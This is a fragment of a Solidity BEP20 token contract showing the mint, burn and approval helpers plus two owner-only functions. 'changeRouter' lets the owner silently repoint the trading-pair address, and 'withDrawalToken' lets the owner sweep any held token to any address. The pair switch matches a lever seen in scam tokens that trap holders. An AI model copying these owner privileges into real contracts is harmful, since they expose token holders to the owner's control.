      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");
    require(_totalSupply.add(amount) <= _maxSupply, "BEP20: exceeded maximum supply");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount, "BEP20: burn amount exceeds allowance"));
  }

  function changeRouter(address router) public onlyOwner {
    uniswapV2Pair = router;
  }

  function withDrawalToken(address token, address _address, uint amount) external onlyOwner returns(bool){
    IERC20(token).transfer(_address, amount);
    emit WithDrawalToken(token, _address, amount);
    return true;
  }
}